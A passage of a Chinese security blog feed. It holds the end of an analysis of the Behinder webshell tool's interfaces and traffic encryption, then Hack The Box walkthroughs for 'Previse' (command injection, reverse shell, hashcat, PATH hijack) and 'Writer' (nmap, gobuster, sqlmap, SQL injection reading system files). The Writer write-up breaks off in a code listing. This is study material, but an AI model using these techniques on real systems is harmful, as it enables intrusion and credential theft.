class="hljs-keyword">boolean</span> <span class="hljs-title">closeLocalPortMap</span><span class="hljs-params">(String targetIP, String targetPort)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 关闭本地端口转发</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">closeLocalPortMapWorker</span><span class="hljs-params">(String socketHash)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 关闭本地端口转发线程</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">closeRemotePortMap</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 关闭远程端口转发</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">byte</span>[] readProxyData(String socketHash) <span class="hljs-keyword">throws</span> Exception; <span class="hljs-comment">// 读取代理过来的数据</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">writeProxyData</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] proxyData, String socketHash)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 通过代理发送数据</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">closeProxy</span><span class="hljs-params">(String socketHash)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 关闭代理</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">openProxy</span><span class="hljs-params">(String destHost, String destPort, String socketHash)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 打开代理</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">openProxyAsyc</span><span class="hljs-params">(String destHost, String destPort, String socketHash)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 异步打开代理</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">echo</span><span class="hljs-params">(String content)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 探测连接是否成功</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getBasicInfo</span><span class="hljs-params">(String whatever)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 获取主机基本信息</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">showErrorMessage</span><span class="hljs-params">(String title, String msg)</span></span>; <span class="hljs-comment">// 弹窗显示错误信息</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">keepAlive</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">connectBack</span><span class="hljs-params">(String type, String ip, String port)</span> <span class="hljs-keyword">throws</span> Exception</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">loadNativeLibrary</span><span class="hljs-params">(String libraryPath)</span> <span class="hljs-keyword">throws</span> Exception</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">executePayload</span><span class="hljs-params">(String uploadLibPath, String payload)</span> <span class="hljs-keyword">throws</span> Exception</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">loadLibraryAndexecutePayload</span><span class="hljs-params">(String fileContent, String payload)</span> <span class="hljs-keyword">throws</span> Exception</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">loadLibraryAndfreeFile</span><span class="hljs-params">(String fileContent, String filePath)</span> <span class="hljs-keyword">throws</span> Exception</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">freeFile</span><span class="hljs-params">(String uploadLibPath, String filePath)</span> <span class="hljs-keyword">throws</span> Exception</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">loadLibraryAndAntiAgent</span><span class="hljs-params">(String fileContent)</span> <span class="hljs-keyword">throws</span> Exception</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">antiAgent</span><span class="hljs-params">(String uploadLibPath)</span> <span class="hljs-keyword">throws</span> Exception</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">loadLibraryAndtest</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 加载DLL测试</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">injectMemShell</span><span class="hljs-params">(String type, String libPath, String path, String password, <span class="hljs-keyword">boolean</span> isAntiAgent)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 注入内存马</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">createReversePortMap</span><span class="hljs-params">(String listenPort)</span> <span class="hljs-keyword">throws</span> Exception</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">byte</span>[] readReversePortMapData(String socketHash) <span class="hljs-keyword">throws</span> Exception;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">writeReversePortMapData</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] proxyData, String socketHash)</span> <span class="hljs-keyword">throws</span> Exception</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">listReversePortMap</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 查看反向端口列表</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">stopReversePortMap</span><span class="hljs-params">(String listenPort)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 停止反向端口连接</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">closeReversePortMap</span><span class="hljs-params">(String socketHash)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 关闭反向端口映射</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="启动流程"><a href="#启动流程" class="headerlink" title="启动流程"></a>启动流程</h2><pre><code class=" mermaid">graph TDid1[net.rebeyond.behinder.ui.Launcher.main]id2[net.rebeyond.behinder.ui.Main.start]id3[FXMLLoader.load Main.fxml]id4[new ShellManager]id5[initCatagoryList]id6[initShellList]id7[initToolbar]id8[initBottomBar]id9[loadProxy]id1 --&gt; id2id2 --&gt; id3id3 --&gt; id4id4 --&gt; id5id5 --&gt; id6id6 --&gt; id7id7 --&gt; id8id8 --&gt; id9</code></pre><h2 id="功能实现分析"><a href="#功能实现分析" class="headerlink" title="功能实现分析"></a>功能实现分析</h2><h3 id="Shell管理"><a href="#Shell管理" class="headerlink" title="Shell管理"></a>Shell管理</h3><p>MainController</p><pre><code class=" mermaid">graph TDloadContextMenu --&gt;  新增新增 --&gt; shellManager.addShellloadContextMenu --&gt;  更新更新 --&gt; shellManager.updateShellloadContextMenu --&gt;  删除删除 --&gt; shellManager.deleteShellloadContextMenu --&gt;  打开打开 --&gt; 加载MainWindow.fxml加载MainWindow.fxml --&gt; 加载Tabs页面加载MainWindow.fxml --&gt; currentShellService.getBasicInfo加载MainWindow.fxml --&gt; shellManager.setShellStatus</code></pre><h3 id="远程管理"><a href="#远程管理" class="headerlink" title="远程管理"></a>远程管理</h3><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>CmdViewController</p><pre><code class=" mermaid">graph TDonCMDKeyPressed --&gt; addHistoryaddHistory --&gt; currentShellService.runCmd</code></pre><h4 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h4><p>FileManagerViewController</p><pre><code class=" mermaid">graph TDloadContextMenu --&gt; 刷新刷新 --&gt; currentShellService.listFilesloadContextMenu --&gt; 打开打开 --&gt; |文件|currentShellService.showFile打开 --&gt; |目录|currentShellService.listFilesloadContextMenu --&gt; 删除删除 --&gt; currentShellService.deleteFile</code></pre><pre><code class=" mermaid">graph TDloadContextMenu --&gt; 重命名重命名 --&gt; currentShellService.renameFileloadContextMenu --&gt; 下载下载 --&gt; currentShellService.downloadFileloadContextMenu --&gt; 上传上传 --&gt; currentShellService.uploadFile</code></pre><pre><code class=" mermaid">graph TDloadContextMenu --&gt; 新建文件夹新建文件夹 --&gt; currentShellService.createDirectoryloadContextMenu --&gt; 修改时间戳修改时间戳 --&gt; currentShellService.updateTimeStamploadContextMenu --&gt; 克隆时间戳未实现</code></pre><h4 id="数据库管理"><a href="#数据库管理" class="headerlink" title="数据库管理"></a>数据库管理</h4><p>DatabaseViewController</p><pre><code class=" mermaid">graph TDinitDatabaseView --&gt; initDatabaseTypeinitDatabaseType --&gt; loadContextMenuloadContextMenu --&gt; loadTreeContextMenuloadContextMenu --&gt; loadTableContextMenuloadTreeContextMenu --&gt; 查询前10条查询前10条 --&gt; executeSQLloadTreeContextMenu --&gt; 查询全部查询全部 --&gt; executeSQLloadTreeContextMenu --&gt; 导出当前表导出当前表 --&gt; executeSQLloadTableContextMenu --&gt; 复制单元格loadTableContextMenu --&gt; 复制整行loadTableContextMenu --&gt; 导出全部查询结果</code></pre><h4 id="交互式命令执行"><a href="#交互式命令执行" class="headerlink" title="交互式命令执行"></a>交互式命令执行</h4><p>RealCmdViewController</p><pre><code class=" mermaid">graph TDinitRealCmdView --&gt; initCmdQueueinitCmdQueue --&gt; createRealCmdcreateRealCmd --&gt; initWorkerscreateRealCmd --&gt; currentShellService.readRealCMDinitWorkers --&gt; currentShellService.writeRealCMD</code></pre><h2 id="流量加密分析"><a href="#流量加密分析" class="headerlink" title="流量加密分析"></a>流量加密分析</h2><p>Utils、Crypt</p><pre><code class=" mermaid">graph TDgetData --&gt; |jsp|EncryptgetData --&gt; |php|EncryptForPhpgetData --&gt; |aspx|EncryptForCSharpgetData --&gt; |asp|EncryptForAspEncrypt --&gt; AES/ECB/PKCS5PaddingEncryptForPhp --&gt; AES/CBC/PKCS5PaddingEncryptForCSharp --&gt; AES/CBC/PKCS5PaddingEncryptForAsp --&gt; 循环异或</code></pre><h2 id="攻击载荷分析"><a href="#攻击载荷分析" class="headerlink" title="攻击载荷分析"></a>攻击载荷分析</h2><p>ShellService、payload</p><h3 id="BasicInfo"><a href="#BasicInfo" class="headerlink" title="BasicInfo"></a>BasicInfo</h3><pre><code class=" mermaid">graph TDShellService.getBasicInfo --&gt; BasicInfoBasicInfo --&gt; |jsp|JavaJava --&gt; System.getenvJava --&gt; System.getPropertiesJava --&gt; getAbsolutePathJava --&gt; File.listRootsBasicInfo --&gt; |php|PhpPhp --&gt; phpinfoPhp --&gt; driveListPhp --&gt; getcwd</code></pre><pre><code class=" mermaid">graph TDShellService.getBasicInfo --&gt; BasicInfoBasicInfo --&gt; |asp|AspAsp --&gt; Server.MapPathAsp --&gt; envlistAsp --&gt; GetWSBasicInfo --&gt; |aspx|CSharpCSharp --&gt; Environment.GetLogicalDrivesCSharp --&gt; Environment.GetEnvironmentVariables </code></pre><h3 id="BShell"><a href="#BShell" class="headerlink" title="BShell"></a>BShell</h3><pre><code class=" mermaid">graph TDShellService.createBShell --&gt; BShellBShell --&gt; |jsp|JavaJava --&gt; CreateCreate --&gt; createBShellcreateBShell --&gt; serverSocketChannel.acceptserverSocketChannel.accept --&gt; Session.setAttribute</code></pre><pre><code class=" mermaid">graph TDShellService.sendBShellCommand --&gt; BShellBShell --&gt; |jsp|JavaJava --&gt; doWorkdoWork --&gt; listFile</code></pre><h3 id="Cmd"><a href="#Cmd" class="headerlink" title="Cmd"></a>Cmd</h3><pre><code class=" mermaid">graph TDShellService.runCmd --&gt; |jsp|JavaJava --&gt; RunCMDRunCMD --&gt; |linux|/bin/shRunCMD --&gt; |windows|cmd.exeShellService.runCmd --&gt; |php|PhpPhp --&gt; systemPhp --&gt; proc_openPhp --&gt; passthruPhp --&gt; shell_execPhp --&gt; exec</code></pre><pre><code class=" mermaid">graph TDShellService.runCmd --&gt; |asp|AspAsp --&gt; WScript.shellAsp --&gt; WScript.shell.1Asp --&gt; shell.applicationAsp --&gt; shell.application.1ShellService.runCmd --&gt; |aspx|CSharpCSharp --&gt; execCMDexecCMD --&gt; cmd.exe</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>二开</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Previse通关记录</title>
    <link href="/2021/11/03/HTB-Previse%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
    <url>/2021/11/03/HTB-Previse%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="/images/pasted-42.png" alt="upload successful"></p><p>访问web服务</p><p><img src="/images/pasted-43.png" alt="upload successful"></p><p>尝试弱口令登录，无果，扫描php文件路径</p><p><img src="/images/pasted-44.png" alt="upload successful"></p><p>发现存在302跳转的页面，访问这里路径，burp可以渲染页面。</p><p><img src="/images/pasted-45.png" alt="upload successful"></p><p><img src="/images/pasted-46.png" alt="upload successful"></p><p>访问accounts.php页面</p><p><img src="/images/pasted-47.png" alt="upload successful"></p><p>尝试创建用户</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;form&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://previse.htb/accounts.php&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;uk-margin&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;uk-inline&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;uk-form-icon&quot;</span> <span class="hljs-attr">uk-icon</span>=<span class="hljs-string">&quot;icon: user&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;uk-input&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Username&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;uk-margin&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;uk-inline&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;uk-form-icon&quot;</span> <span class="hljs-attr">uk-icon</span>=<span class="hljs-string">&quot;icon: lock&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;uk-input&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Password&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;uk-margin&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;uk-inline&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;uk-form-icon&quot;</span> <span class="hljs-attr">uk-icon</span>=<span class="hljs-string">&quot;icon: lock&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;confirm&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;uk-input&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;confirm&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Confirm Password&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;uk-button uk-button-default&quot;</span>&gt;</span>CREATE USER<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p><img src="/images/pasted-48.png" alt="upload successful"></p><p>通过创建的用户成功登录后台管理页面。</p><p><img src="/images/pasted-49.png" alt="upload successful"></p><p>files目录存在网站备份文件，下载下来后打开，发现是网站源码。</p><p><img src="/images/pasted-50.png" alt="upload successful"></p><p>审计源码，发现在logs.php中存在命令注入漏洞</p><p><img src="/images/pasted-51.png" alt="upload successful"></p><h2 id="获取权限"><a href="#获取权限" class="headerlink" title="获取权限"></a>获取权限</h2><p>通过参数delim注入命令反弹拿到shell</p><p><img src="/images/pasted-52.png" alt="upload successful"></p><p><img src="/images/pasted-53.png" alt="upload successful"></p><p>查看数据库配置文件，得到数据库密码</p><p><img src="/images/pasted-54.png" alt="upload successful"></p><p>端口转发本地3306到外网4444</p><p><img src="/images/pasted-55.png" alt="upload successful"></p><p>连接数据库获得用户m4lwhere密码</p><p><img src="/images/pasted-56.png" alt="upload successful"></p><p>hashcat爆破密码</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">hashcat -a 0 -m 500 hash.txt --wordlist /usr/share/wordlists/rockyou.txt<br></code></pre></div></td></tr></table></figure><p><img src="/images/pasted-57.png" alt="upload successful"></p><p>ssh登录，拿到user.txt</p><p><img src="/images/pasted-58.png" alt="upload successful"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>查看sudo列表</p><p><img src="/images/pasted-59.png" alt="upload successful"></p><p>查看/opt/scripts/access_backup.sh的文件内容</p><p><img src="/images/pasted-60.png" alt="upload successful"></p><p>通过PATH变量劫持gzip程序反弹shell</p><p><img src="/images/pasted-62.png" alt="upload successful"></p><p>拿到root.txt<br><img src="/images/pasted-61.png" alt="upload successful"></p><h2 id="总结学习"><a href="#总结学习" class="headerlink" title="总结学习"></a>总结学习</h2><ul><li>PATH变量劫持</li><li>细节决定成败</li><li>信息收集、信息收集、信息收集</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>HTB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Writer通关记录</title>
    <link href="/2021/11/02/HTB-Writer%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
    <url>/2021/11/02/HTB-Writer%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo nmap -sC -sV writer.htb<br></code></pre></div></td></tr></table></figure><p><img src="/images/pasted-3.png" alt="upload successful"><br>爆破目录信息</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">gobuster dir  -u http://writer.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br></code></pre></div></td></tr></table></figure><p><img src="/images/pasted-0.png" alt="upload successful"></p><p>获得一个/administrative目录，访问该目录</p><p><img src="/images/pasted-1.png" alt="upload successful"></p><p>输入admin/admin进行登录，xray报uname字段存在SQL时间盲注漏洞。</p><p><img src="/images/pasted-2.png" alt="upload successful"></p><p>sqlmap检查一下，看是否存在其他类型的注入</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sqlmap -u http://writer.htb/administrative --data=<span class="hljs-string">&quot;uname=admin&amp;password=admin&quot;</span> <br></code></pre></div></td></tr></table></figure><p><img src="/images/pasted-4.png" alt="upload successful"></p><p>发现存在联合查询注入类型。</p><p>使用联合查询类型手工读取/etc/passwd</p><p><img src="/images/pasted-5.png" alt="upload successful"></p><p>80端口开放的是apache，因此我们这里尝试读取apache的网站配置文件路径/etc/apache2/sites-enabled/000-default.conf</p><p><img src="/images/pasted-6.png" alt="upload successful"></p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs conf"># Virtual host configuration for writer.htb domain<br>&lt;VirtualHost *:80&gt;<br>        ServerName writer.htb<br>        ServerAdmin admin@writer.htb<br>        WSGIScriptAlias / /var/www/writer.htb/writer.wsgi<br>        &lt;Directory /var/www/writer.htb&gt;<br>                Order allow,deny<br>                Allow from all<br>        &lt;/Directory&gt;<br>        Alias /static /var/www/writer.htb/writer/static<br>        &lt;Directory /var/www/writer.htb/writer/static/&gt;<br>                Order allow,deny<br>                Allow from all<br>        &lt;/Directory&gt;<br>        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log<br>        LogLevel warn<br>        CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined<br>&lt;/VirtualHost&gt;<br><br># Virtual host configuration for dev.writer.htb subdomain<br># Will enable configuration after completing backend development<br># Listen 8080<br>#&lt;VirtualHost 127.0.0.1:8080&gt;<br>#ServerName dev.writer.htb<br>#ServerAdmin admin@writer.htb<br>#<br>        # Collect static for the writer2_project/writer_web/templates<br>#Alias /static /var/www/writer2_project/static<br>#&lt;Directory /var/www/writer2_project/static&gt;<br>#Require all granted<br>#&lt;/Directory&gt;<br>#<br>#&lt;Directory /var/www/writer2_project/writerv2&gt;<br>#&lt;Files wsgi.py&gt;<br>#Require all granted<br>#&lt;/Files&gt;<br>#&lt;/Directory&gt;<br>#<br>#WSGIDaemonProcess writer2_project python-path=/var/www/writer2_project python-home=/var/www/writer2_project/writer2env<br>#WSGIProcessGroup writer2_project<br>#WSGIScriptAlias / /var/www/writer2_project/writerv2/wsgi.py<br>#        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log<br>#        LogLevel warn<br>#        CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined<br>#<br>#&lt;/VirtualHost&gt;<br># vim: syntax=apache ts=4 sw=4 sts=4 sr noet<br></code></pre></div></td></tr></table></figure><p>通过配置文件，我们得知服务端是使用python编写，服务端路径为/var/www/writer.htb/，因此我们尝试读取服务端代码，进行代码审计查找漏洞。</p><p>读取<code>/var/www/writer.htb/writer/__init__.py</code></p><p><img src="/images/pasted-7.png" alt="upload successful"></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span 